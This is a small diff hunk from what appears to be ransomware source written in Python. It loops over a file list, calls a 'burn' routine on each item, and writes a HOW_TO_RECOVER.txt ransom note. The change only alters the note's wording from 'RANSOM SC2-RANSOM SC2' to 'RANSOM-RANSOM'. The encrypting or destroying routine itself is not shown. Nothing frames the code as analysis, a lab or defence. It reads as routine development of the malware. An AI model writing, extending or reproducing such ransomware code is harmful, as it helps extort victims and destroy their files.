@@ -10,4 +10,4 @@ for item in archivos:
     burn.main(item)
 
 with open("HOW_TO_RECOVER.txt",'w') as file:
-    file.write("RANSOM SC2-RANSOM SC2")
+    file.write("RANSOM-RANSOM")
